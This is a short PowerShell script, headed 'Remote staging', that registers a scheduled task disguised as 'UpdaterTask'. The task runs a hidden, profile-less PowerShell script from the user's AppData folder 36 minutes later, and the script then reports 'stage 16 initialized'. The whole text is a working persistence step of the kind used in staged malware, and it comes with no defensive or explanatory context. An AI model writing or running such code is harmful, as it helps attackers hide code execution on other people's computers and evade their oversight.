# Remote staging
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\updater.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(36)
Register-ScheduledTask -TaskName "UpdaterTask" -Action $TaskAction -Trigger $TaskTrigger -Force
Write-Output "stage 16 initialized"
